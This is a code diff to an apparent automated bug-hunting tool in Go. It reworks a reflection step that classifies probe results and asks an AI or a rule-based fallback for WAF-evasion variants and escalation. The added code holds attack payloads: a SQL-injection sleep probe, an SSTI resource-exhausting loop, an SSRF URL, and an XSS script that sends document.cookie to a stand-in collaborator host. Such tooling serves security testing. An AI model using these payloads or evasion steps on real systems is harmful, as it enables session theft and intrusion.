@@ -7,7 +7,6 @@ import (
 
 	"auto-bughunter/backend/internal/model"
 )
-
 // ReflectionResult is the structured output of a single pentest-loop reflection
 // step. The AI (or local reasoner) analyses what has been tried so far and
 // proposes concrete adjustments for the next iteration.
@@ -66,7 +65,10 @@ type RefinedHint struct {
 //   - target: the base URL being tested
 //   - round: the 1-based round number just completed
 //   - findings: all findings confirmed so far across all rounds
-//   - triedHypotheses: the hypotheses that were executed in the round just finished
+//   - probeResults: the full HTTP-level outcome of every probe run this round,
+//     including unconfirmed ones (WAF blocks, near-misses, server errors).
+//     These give the AI the raw evidence it needs to reason about WHY a probe
+//     failed and what different approach to try next.
 //   - coverageMap: per-category list of endpoints already tested (from CoverageTracker)
 //
 // Falls back to a rule-based local reasoner when no AI provider is configured.
@@ -75,29 +77,34 @@ func (c *Client) Reflect(
 	target string,
 	round int,
 	findings []model.Finding,
-	triedHypotheses []VulnerabilityHypothesis,
+	probeResults []model.ProbeResult,
 	coverageMap map[string][]string,
 ) ReflectionResult {
 	if c == nil || !c.shouldCallProvider() {
-		return localReasonerReflect(target, round, findings, triedHypotheses, coverageMap)
+		return localReasonerReflect(target, round, findings, probeResults, coverageMap)
 	}
 
-	// Build a compact view of tried hypotheses for the prompt.
-	tried := make([]map[string]string, 0, len(triedHypotheses))
-	for _, h := range triedHypotheses {
-		tried = append(tried, map[string]string{
-			"category":    h.Category,
-			"endpoint":    h.Endpoint,
-			"paramName":   h.ParamName,
-			"payloadHint": h.PayloadHint,
-		})
+	// Build a compact probe-result summary for the AI prompt.
+	// Each entry includes the outcome classification and the plain-English
+	// observation — this is the key data the AI uses to distinguish WAF blocks
+	// from genuine negatives and near-misses that warrant refined payloads.
+	probesSummary := make([]map[string]string, 0, len(probeResults))
+	for _, pr := range probeResults {
+		entry := map[string]string{
+			"category":    pr.Category,
+			"endpoint":    pr.Endpoint,
+			"paramName":   pr.ParamName,
+			"payload":     pr.Payload,
+			"outcome":     string(pr.Outcome),
+			"statusCode":  itoa(pr.StatusCode),
+			"observation": pr.Observation,
+		}
+		probesSummary = append(probesSummary, entry)
 	}
 
 	// Build a compact finding summary.
-	confirmedCats := map[string]struct{}{}
 	findingSummary := make([]map[string]string, 0, len(findings))
 	for _, f := range findings {
-		confirmedCats[strings.ToLower(f.Category)] = struct{}{}
 		findingSummary = append(findingSummary, map[string]string{
 			"category": f.Category,
 			"severity": string(f.Severity),
@@ -107,29 +114,35 @@ func (c *Client) Reflect(
 	}
 
 	payload := map[string]any{
-		"target":          target,
-		"round":           round,
-		"findings":        findingSummary,
-		"triedHypotheses": tried,
-		"coverageMap":     coverageMap,
+		"target":       target,
+		"round":        round,
+		"findings":     findingSummary,
+		"probeResults": probesSummary,
+		"coverageMap":  coverageMap,
 		"instructions": "You are an expert penetration tester reflecting on a completed scan iteration. " +
-			"Analyse what vulnerability classes, endpoints, and parameters have been tested and which have NOT. " +
-			"Write a clear iterationRationale (2–3 sentences) that explains in plain English WHY another " +
-			"iteration is warranted: cite the specific signals (untested categories, response anomalies, " +
-			"partial hits) that justify continuing rather than stopping. If no further iteration is useful, " +
-			"explain that conclusion in iterationRationale instead. " +
-			"Identify gaps in coverage, note any partially-confirmed signals that warrant refinement, and " +
-			"recommend up to 3 corrective or evasion-variant payloads as refinedHints. " +
-			"List focusAreas (up to 4 category names) that the next round should target. " +
-			"Set shouldEscalate to true if the findings suggest deeper (authenticated, WAF-bypass) probing is needed. " +
-			"List skipCategories that are fully confirmed or exhausted. " +
+			"The 'probeResults' array contains the full HTTP-level observation for EVERY probe run this round, " +
+			"including ones that were blocked, near-missed, or returned server errors. " +
+			"Use the 'outcome' and 'observation' fields to understand WHY each probe succeeded or failed. " +
+			"For example: 'waf_blocked' means the payload was filtered — propose an evasion variant; " +
+			"'near_miss' means a partial signal was observed — refine the payload for the specific context; " +
+			"'server_error' on an injection probe means an exception was triggered — follow up with blind probes; " +
+			"'no_signal' means the target is genuinely clean on that combination. " +
+			"Write a clear iterationRationale (2–3 sentences) in plain English explaining WHY another iteration " +
+			"is warranted, citing specific signals from probeResults (e.g. 'Two XSS probes were WAF-blocked " +
+			"suggesting the payload is being filtered; evasion variants should be tried.'). " +
+			"If no further iteration is useful, explain that conclusion in iterationRationale instead. " +
+			"Recommend up to 3 refined payload hints as refinedHints, each targeting a specific near-miss or blocked probe. " +
+			"List focusAreas (up to 4 category names) for the next round. " +
+			"Set shouldEscalate to true if probeResults show WAF blocking or auth enforcement that requires " +
+			"authenticated or bypass-level probing. " +
+			"List skipCategories that are fully confirmed or have no_signal across all tried endpoints. " +
 			"Reply with strict JSON only: " +
 			`{"gapAnalysis":string,"iterationRationale":string,"focusAreas":[string],"refinedHints":[{"category":string,"endpoint":string,"paramName":string,"payloadHint":string,"rationale":string}],"shouldEscalate":bool,"escalationReason":string,"skipCategories":[string]}`,
 	}
 
 	userJSON, err := json.Marshal(payload)
 	if err != nil {
-		return localReasonerReflect(target, round, findings, triedHypotheses, coverageMap)
+		return localReasonerReflect(target, round, findings, probeResults, coverageMap)
 	}
 
 	messages := []Message{
@@ -139,12 +152,12 @@ func (c *Client) Reflect(
 
 	content, err := c.planningComplete(ctx, messages, 0.3, true)
 	if err != nil || content == "" {
-		return localReasonerReflect(target, round, findings, triedHypotheses, coverageMap)
+		return localReasonerReflect(target, round, findings, probeResults, coverageMap)
 	}
 
 	var result ReflectionResult
 	if err := json.Unmarshal([]byte(content), &result); err != nil {
-		return localReasonerReflect(target, round, findings, triedHypotheses, coverageMap)
+		return localReasonerReflect(target, round, findings, probeResults, coverageMap)
 	}
 	return result
 }
@@ -157,12 +170,14 @@ var allCategories = []string{
 }
 
 // localReasonerReflect is the rule-based fallback reflection used when no AI
-// provider is configured. It computes coverage gaps deterministically.
+// provider is configured. It uses ProbeResult outcome data to classify what
+// actually happened during each probe — WAF blocks, near-misses, server errors
+// — and writes plain-English rationale to explain the iteration decision.
 func localReasonerReflect(
 	_ string,
 	round int,
 	findings []model.Finding,
-	triedHypotheses []VulnerabilityHypothesis,
+	probeResults []model.ProbeResult,
 	coverageMap map[string][]string,
 ) ReflectionResult {
 	// Determine which categories have been confirmed in findings.
@@ -174,18 +189,32 @@ func localReasonerReflect(
 		}
 	}
 
-	// Determine which categories have been tried.
+	// Analyse probe outcomes to understand what happened.
+	outcomesByCat := map[string][]model.ProbeOutcome{}
 	tried := map[string]bool{}
 	triedEndpoints := map[string][]string{}
-	for _, h := range triedHypotheses {
-		cat := strings.ToLower(strings.TrimSpace(h.Category))
+	wafBlockedCats := map[string]bool{}
+	nearMissCats := map[string]bool{}
+	serverErrorCats := map[string]bool{}
+
+	for _, pr := range probeResults {
+		cat := strings.ToLower(strings.TrimSpace(pr.Category))
 		tried[cat] = true
-		ep := strings.TrimSpace(h.Endpoint)
+		ep := strings.TrimSpace(pr.Endpoint)
 		if ep != "" {
 			triedEndpoints[cat] = append(triedEndpoints[cat], ep)
 		}
+		outcomesByCat[cat] = append(outcomesByCat[cat], pr.Outcome)
+		switch pr.Outcome {
+		case model.ProbeWAFBlocked:
+			wafBlockedCats[cat] = true
+		case model.ProbeNearMiss:
+			nearMissCats[cat] = true
+		case model.ProbeServerError:
+			serverErrorCats[cat] = true
+		}
 	}
-	// Also mark categories appearing in the coverage map as tried.
+	// Also mark categories in the coverage map as tried.
 	for cat, eps := range coverageMap {
 		if len(eps) > 0 {
 			tried[strings.ToLower(cat)] = true
@@ -205,10 +234,22 @@ func localReasonerReflect(
 		gapAnalysis = "Untested vulnerability categories after round " + itoa(round) + ": " + strings.Join(gaps, ", ") + "."
 	}
 
-	// Focus areas: prioritise gaps, then unconfirmed tried categories.
+	// Focus areas: prioritise gaps, then near-misses and WAF-blocked categories.
 	focusAreas := make([]string, 0, 4)
 	for _, cat := range gaps {
 		focusAreas = append(focusAreas, cat)
+		if len(focusAreas) >= 4 {
+			break
+		}
+	}
+	for cat := range nearMissCats {
+		focusAreas = appendUniqueString(focusAreas, cat)
+		if len(focusAreas) >= 4 {
+			break
+		}
+	}
+	for cat := range wafBlockedCats {
+		focusAreas = appendUniqueString(focusAreas, cat)
 		if len(focusAreas) >= 4 {
 			break
 		}
@@ -224,32 +265,53 @@ func localReasonerReflect(
 		}
 	}
 
-	// Refined hints: propose evasion/alternative payloads for tried-but-unconfirmed.
+	// Refined hints: derive from near-miss and WAF-blocked probe results.
 	var refinedHints []RefinedHint
-	for _, h := range triedHypotheses {
-		cat := strings.ToLower(strings.TrimSpace(h.Category))
-		if confirmed[cat] {
-			continue // already confirmed; no need to refine
+	for _, pr := range probeResults {
+		cat := strings.ToLower(strings.TrimSpace(pr.Category))
+		if confirmed[cat] || len(refinedHints) >= 3 {
+			continue
 		}
-		ep := strings.TrimSpace(h.Endpoint)
+		ep := strings.TrimSpace(pr.Endpoint)
 		if ep == "" {
 			continue
 		}
-		// Propose one alternative payload per unconfirmed tried category (up to 3).
-		if len(refinedHints) >= 3 {
-			break
+		switch pr.Outcome {
+		case model.ProbeWAFBlocked:
+			alt := alternativePayload(cat, pr.Payload)
+			if alt != "" && alt != pr.Payload {
+				refinedHints = append(refinedHints, RefinedHint{
+					Category:    pr.Category,
+					Endpoint:    ep,
+					ParamName:   pr.ParamName,
+					PayloadHint: alt,
+					Rationale:   "Previous payload was WAF-blocked (HTTP " + itoa(pr.StatusCode) + "); trying an evasion-variant for " + pr.Category + ".",
+				})
+			}
+		case model.ProbeNearMiss:
+			alt := alternativePayload(cat, pr.Payload)
+			if alt != "" && alt != pr.Payload {
+				refinedHints = append(refinedHints, RefinedHint{
+					Category:    pr.Category,
+					Endpoint:    ep,
+					ParamName:   pr.ParamName,
+					PayloadHint: alt,
+					Rationale:   "Near-miss signal observed: " + pr.Observation + " Trying a refined payload.",
+				})
+			}
+		case model.ProbeServerError:
+			// Server error on injection — try a blind/time-based payload.
+			blind := blindPayloadForCategory(cat)
+			if blind != "" {
+				refinedHints = append(refinedHints, RefinedHint{
+					Category:    pr.Category,
+					Endpoint:    ep,
+					ParamName:   pr.ParamName,
+					PayloadHint: blind,
+					Rationale:   "Server returned HTTP " + itoa(pr.StatusCode) + " on injection probe — unhandled exception detected. Trying blind/time-based confirmation.",
+				})
+			}
 		}
-		alt := alternativePayload(cat, h.PayloadHint)
-		if alt == "" || alt == h.PayloadHint {
-			continue
-		}
-		refinedHints = append(refinedHints, RefinedHint{
-			Category:    h.Category,
-			Endpoint:    ep,
-			ParamName:   h.ParamName,
-			PayloadHint: alt,
-			Rationale:   "Previous payload may have been filtered; trying an evasion-variant for " + h.Category + ".",
-		})
 	}
 
 	// Skip categories: those already confirmed at high confidence.
@@ -261,15 +323,26 @@ func localReasonerReflect(
 		}
 	}
 
-	// Escalation: suggest if round >= 2 and no new findings in this round.
-	shouldEscalate := round >= 2 && len(findings) == 0
+	// Escalation: suggest if WAF blocking was seen or if round >= 2 with no findings.
+	shouldEscalate := (len(wafBlockedCats) > 0 && round >= 2) || (round >= 2 && len(findings) == 0)
 	escalationReason := ""
 	if shouldEscalate {
-		escalationReason = "No findings after " + itoa(round) + " rounds; escalate to authenticated or WAF-bypass probing."
+		if len(wafBlockedCats) > 0 {
+			wafCats := make([]string, 0, len(wafBlockedCats))
+			for c := range wafBlockedCats {
+				wafCats = append(wafCats, c)
+			}
+			escalationReason = "WAF blocking detected on: " + strings.Join(wafCats, ", ") + ". Escalate to authenticated or WAF-bypass probing."
+		} else {
+			escalationReason = "No findings after " + itoa(round) + " rounds; escalate to authenticated or WAF-bypass probing."
+		}
 	}
 
-	// IterationRationale: rule-based explanation of why another round is needed.
-	iterationRationale := buildLocalIterationRationale(round, gaps, focusAreas, refinedHints, shouldEscalate, escalationReason, confirmed)
+	// IterationRationale: synthesise a plain-English explanation.
+	iterationRationale := buildLocalIterationRationale(
+		round, gaps, focusAreas, refinedHints, shouldEscalate, escalationReason,
+		confirmed, wafBlockedCats, nearMissCats, serverErrorCats,
+	)
 
 	return ReflectionResult{
 		GapAnalysis:        gapAnalysis,
@@ -283,9 +356,8 @@ func localReasonerReflect(
 }
 
 // buildLocalIterationRationale generates a plain-English explanation of why
-// the reasoning loop should (or should not) continue, without calling an AI
-// provider. It mirrors what the AI would write, using the same rule-based
-// signals that drove the rest of the local-reasoner output.
+// the reasoning loop should (or should not) continue, incorporating actual
+// probe outcome signals (WAF blocks, near-misses, server errors).
 func buildLocalIterationRationale(
 	round int,
 	gaps, focusAreas []string,
@@ -293,8 +365,9 @@ func buildLocalIterationRationale(
 	shouldEscalate bool,
 	escalationReason string,
 	confirmed map[string]bool,
+	wafBlocked, nearMiss, serverError map[string]bool,
 ) string {
-	if len(gaps) == 0 && len(refinedHints) == 0 && !shouldEscalate {
+	if len(gaps) == 0 && len(refinedHints) == 0 && len(wafBlocked) == 0 && len(nearMiss) == 0 && len(serverError) == 0 && !shouldEscalate {
 		if len(confirmed) > 0 {
 			cats := make([]string, 0, len(confirmed))
 			for c := range confirmed {
@@ -311,18 +384,42 @@ func buildLocalIterationRationale(
 	var b strings.Builder
 	b.WriteString("Round " + itoa(round) + " complete. ")
 
+	if len(wafBlocked) > 0 {
+		cats := make([]string, 0, len(wafBlocked))
+		for c := range wafBlocked {
+			cats = append(cats, c)
+		}
+		b.WriteString("WAF blocking was detected on probes for: ")
+		b.WriteString(strings.Join(cats, ", "))
+		b.WriteString(". The target may still be vulnerable — the payloads were filtered before reaching application logic. ")
+		b.WriteString("The next round will retry with evasion-variant payloads (URL-encoding, case variation, chunked transfer). ")
+	}
+
+	if len(nearMiss) > 0 {
+		cats := make([]string, 0, len(nearMiss))
+		for c := range nearMiss {
+			cats = append(cats, c)
+		}
+		b.WriteString("Near-miss signals were observed for: ")
+		b.WriteString(strings.Join(cats, ", "))
+		b.WriteString(". Partial signals (reflected substrings, application errors, timing anomalies) suggest the vulnerability may be present but in a different injection context. ")
+		b.WriteString("Refined context-specific payloads will be attempted next round. ")
+	}
+
+	if len(serverError) > 0 {
+		cats := make([]string, 0, len(serverError))
+		for c := range serverError {
+			cats = append(cats, c)
+		}
+		b.WriteString("Server errors (5xx) were triggered by injection probes on: ")
+		b.WriteString(strings.Join(cats, ", "))
+		b.WriteString(". An unhandled application exception on a crafted input is a strong injection signal — blind/time-based follow-up probes are warranted. ")
+	}
+
 	if len(gaps) > 0 {
 		b.WriteString("The following vulnerability categories remain untested: ")
 		b.WriteString(strings.Join(gaps, ", "))
-		b.WriteString(". ")
-		b.WriteString("Iterating to ensure full coverage before concluding the engagement. ")
-	}
-
-	if len(refinedHints) > 0 {
-		b.WriteString("Additionally, ")
-		b.WriteString(itoa(len(refinedHints)))
-		b.WriteString(" previous payload(s) were blocked or returned ambiguous results — ")
-		b.WriteString("the next round will retry with evasion-variant payloads to rule out filtering artefacts. ")
+		b.WriteString(". Iterating to ensure full coverage before concluding the engagement. ")
 	}
 
 	if shouldEscalate && escalationReason != "" {
@@ -337,6 +434,23 @@ func buildLocalIterationRationale(
 	}
 
 	return strings.TrimSpace(b.String())
+}
+
+// blindPayloadForCategory returns a blind/time-based payload for categories
+// where a server error was observed, for follow-up confirmation probes.
+func blindPayloadForCategory(category string) string {
+	switch category {
+	case "sqli":
+		return "1 AND SLEEP(5)--"
+	case "ssti":
+		return "{{range $i,$e := until 9999999}}{{end}}"
+	case "xss":
+		return `"><script>fetch('https://burpcollaborator.example.com/'+document.cookie)</script>`
+	case "ssrf":
+		return "http://burpcollaborator.example.com/"
+	default:
+		return ""
+	}
 }
 
 // alternativePayload returns a WAF-evasion or structural variant of payload for
